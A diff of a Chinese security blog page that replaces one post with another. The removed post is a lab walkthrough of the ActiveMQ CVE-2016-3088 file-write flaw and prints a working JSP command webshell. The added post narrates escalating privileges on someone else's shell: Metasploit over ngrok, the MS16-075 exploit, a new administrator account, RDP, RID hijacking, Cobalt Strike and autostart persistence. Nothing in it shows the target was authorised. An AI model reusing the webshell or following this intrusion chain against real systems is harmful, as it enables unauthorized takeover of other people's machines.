@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088） | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="ActiveMQ任意文件写入漏洞（CVE-2016-3088） | 九世的博客">
+  <title>一次玄学提权 | 九世的博客</title>
+  <meta name="keywords" content=" 提权 ">
+  <meta name="description" content="一次玄学提权 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -922,9 +922,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-复现ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-一次玄学提权" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1>
+        <h1 class="article-title">一次玄学提权</h1>
     
     <div class="article-meta">
         
@@ -933,14 +933,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">提权</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-07-25 06:43</time>
+        创建时间:<time class="date" title="更新时间: 2019-08-03 23:21:05">2019-08-03 22:50</time>
         
     </div>
     <div class="article-meta">
@@ -962,7 +962,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -977,78 +977,32 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p>
-<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p>
-<pre><code>Vulhub漏靶场搭建方法：
-
-vulhub官网：http://vulhub.org/#/docs/download-vulhub/
-1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io
-2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip
-3.安装docker-compose:pip install docker-compose
-4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git
-
-安装好之后进入对应的漏洞文件执行：docker-compose up -d
-如果出现：Couldn&apos;t connect to Docker daemon at http+xxx的问题有三个解决的方法：
-1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;
-2.在使用docker-compose附加上sudo sudo docker-compose up -d
-3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker
-</code></pre><p>漏洞介绍：</p>
-<pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。
-
-fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：
-
-其使用率并不高
-文件操作容易出现漏洞
-所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
-</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p>
-<p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p>
-<pre><code>cd /vulhub/activemq/CVE-2016-3088 
-</code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p>
-<pre><code>然后执行docker-compose -build 下载漏洞环境
-然后在执行docker-compose up -d 启动
-</code></pre><p>之后我们打开浏览器访问：</p>
-<pre><code>http://127.0.0.1:8161
-</code></pre><p>我们可以看到如下图所示：</p>
-<p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p>
-<p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p>
-<pre><code>http://your-ip:8161/admin/test/systemProperties.jsp
-</code></pre><p>查看ActiveMQ的绝对路径</p>
-<p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p>
-<p>绝对路径为：</p>
-<pre><code>/opt/activemq
-</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p>
-<p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p>
-<pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; 
-&lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;
-&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; 
-&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; 
-&lt;/FORM&gt; &lt;pre&gt; 
-&lt;%
- if ( request.getParameter( &quot;comment&quot; ) != null )
- {
-     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );
-     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );
-     OutputStream os    = p.getOutputStream();
-     InputStream in        = p.getInputStream();
-     DataInputStream dis    = new DataInputStream( in );
-     String disr        = dis.readLine();
-     while ( disr != null )
-     {
-         out.println( disr ); disr = dis.readLine();
-     }
- }
- %&gt;
- &lt;/pre&gt; 
- &lt;/BODY&gt;&lt;/HTML&gt;
-</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p>
-<p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p>
-<p>HTTP状态码为204，即为上传成功</p>
-<p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p>
-<p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p>
-<p><img src="https://i.imgur.com/asEAY27.png" alt=""></p>
-<p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p>
-<p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p>
-<p>转载请声明：来之422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某友扔了个shell给我，问我能不能提权，故事就这么开始了<br><img src="https://s2.ax1x.com/2019/08/03/esZdKS.png" alt="esZdKS.png"></p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>菜刀连上一看，权限小的可怕<br><img src="https://s2.ax1x.com/2019/08/03/esZ2vT.png" alt="esZ2vT.png"></p>
+<p>查看一波补丁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/esZo5R.png" alt="esZo5R.png"></p>
+<p>查看一下用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/esZH8x.png" alt="esZH8x.png"></p>
+<p>查看一下administrators组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/esZXrD.png" alt="esZXrD.png"></p>
+<p>将刚刚的补丁号扔去提权辅助页面查一手exp<br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助网页</a></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/eseCGt.md.png" alt="eseCGt.md.png"></p>
+<p>试一波exp后发行不行，ngrok+msf获取meterpreter<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok tcp 4444</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/eseeaj.png" alt="eseeaj.png"></p>
+<p>得到meterpreter,反手就试一波getsystem,不行<br><img src="https://s2.ax1x.com/2019/08/03/eseMR0.md.png" alt="eseMR0.md.png"></p>
+<p>选择<code>/recon/local_exploit_suggester</code>模块获取一波能利用的exp,这里懒就不截图了<br>模块用法参考:<a href="https://422926799.github.io/posts/80762752.html">https://422926799.github.io/posts/80762752.html</a></p>
+<p>得到一个名为<code>MS16-075</code>的exp，用msf的试了一手，发现不行，可能是我操作错了<br><img src="https://s2.ax1x.com/2019/08/03/eseyee.png" alt="eseyee.png"></p>
+<p>然后去找exp来使<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" rel="noopener">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits · GitHub</a></p>
+<p>然后第一次用的时候贼玄学，明明都已经出来了system。就是伪造不了令牌，后面一看又没了system用户<br><img src="https://s2.ax1x.com/2019/08/03/ese7wQ.png" alt="ese7wQ.png"></p>
+<p>隔几分钟后在试了一遍，提下来了<br><img src="https://s2.ax1x.com/2019/08/03/eseOWq.png" alt="eseOWq.png"></p>
+<p>反手加用户加入administrator组<br><img src="https://s2.ax1x.com/2019/08/03/esmik9.png" alt="esmik9.png"></p>
+<p>反手查询RDP端口<br><img src="https://s2.ax1x.com/2019/08/03/esmJ6f.png" alt="esmJ6f.png"></p>
+<p>反手登录RDP，然后加个RID劫持获取管理员全部数据<br><img src="https://s2.ax1x.com/2019/08/03/esmU0g.md.png" alt="esmU0g.md.png"></p>
+<p>RID劫持重新登录RDP<br><img src="https://s2.ax1x.com/2019/08/03/esmTc6.md.png" alt="esmTc6.md.png"></p>
+<p>加入cs<br><img src="https://s2.ax1x.com/2019/08/03/esmLHe.png" alt="esmLHe.png"></p>
+<p>加个开机自启<br><img src="https://s2.ax1x.com/2019/08/03/esnPu8.md.png" alt="esnPu8.md.png"></p>
+<p>持久后门文章请参考：<a href="https://422926799.github.io/posts/26a6c441.html">持久化控制学习 | 九世的博客</a></p>
+<p>完</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1058,12 +1012,12 @@ fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HT
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</p>
+    <p><span class="copy-title">文章标题:</span>一次玄学提权</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-07-25, 06:43:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/55a9538c.html" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）">http://422926799.github.io/posts/55a9538c.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-03, 22:50:34</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-03, 23:21:05</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/589f1dca.html" title="一次玄学提权">http://422926799.github.io/posts/589f1dca.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
